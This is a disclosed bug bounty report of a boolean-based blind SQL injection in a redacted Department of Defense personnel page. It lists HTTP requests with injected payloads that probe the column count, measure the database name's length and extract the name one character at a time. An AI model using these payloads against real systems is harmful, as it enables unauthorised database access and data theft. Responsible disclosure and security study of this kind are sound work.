# [████████] Boolean SQL Injection (/personnel.php?content=profile&rcnum=*)

## Report Details
- **Report ID**: 648346
- **URL**: https://hackerone.com/reports/648346
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-07-17T21:14:23.939Z
- **Disclosed**: 2019-12-02T19:24:22.442Z

## Reporter
- **Username**: jarvis0x1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
In this report, I want to describe a dangerous SQL injection, with the help of which I was able to extract certain data from the database.  

I used the insights from this report #648222. Using the bug from the aforementioned report, I could find this endpoint and done SQL injection.

### Steps to reproduce
1) Use this request:

```
GET /personnel.php?content=profile&rcnum=rc12346'+++and+(select++substr(database(),1,1)++=++'c')+and+'1'='1 HTTP/1.1
Host: ███████
Connection: close


```

Text for find
```ame='firstName' minlength='1' maxlength='20' size='15' value='```

If sql expression is successful, the answer will be ```True```:
█████████

If not success ```False```:
██████

Payloads, what response ```True```:
```
2=2
true
'test'='test'
len('12345')=5
2*4*3=8*3
```

Paylods, what response ```False```:
```
1=2
false
'test'='admin'
len('12345')=10
2*3*4=3*4
```

3) Then I try to extract number of colums in current table:

```
GET /personnel.php?content=profile&rcnum=rc12346'+order+by+49--+ HTTP/1.1
Host: █████████
Connection: close


```

Then I try to extract length of DB using this request. 

Length of DB by payload is ```39```:
```
GET /personnel.php?content=profile&rcnum=rc12346'+++and++(select+length(database())+=+39+)++and+'1'='1 HTTP/1.1
Host: ████████
Connection: close


```

Then I try to extract name of DB using this request:

```
GET /personnel.php?content=profile&rcnum=rc12346'+++and+(select++substr(database(),1,1)++=++'c')+and+'1'='1 HTTP/1.1
Host: ███
Connection: close


```

First symbol:
█████

Second:
█████████

3 symbols:
```
GET /personnel.php?content=profile&rcnum=rc12346'+++and+(select++substr(database(),1,3)='cf_')+and+'1'='1 HTTP/1.1
Host: █████████
Connection: close


```
Full db name is ```█████████```



# Attention!

I want to draw your attention that I have already found sql injection on this site. This report is #512693.
Vulnerability in the report specified by me is performed only from an authorized user. Last time, your team could not validate this vulnerability due to the fact that the developers made changes to the site very quickly. But this vulnerability still exists! This vulnerability in another endpoint (other part of site load for user, endpoint is ```personnel.php?content=training&folder=FA_CERT&item=*&rcnum=rc22752```) and available only for authorized users.  Please send this vulnerability for review to developers, having previously triage it.

In the current report, I gave evidence that my last report #512693 is also valid. I hope for your understanding.

## Impact

Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.

## Attachments
No attachments
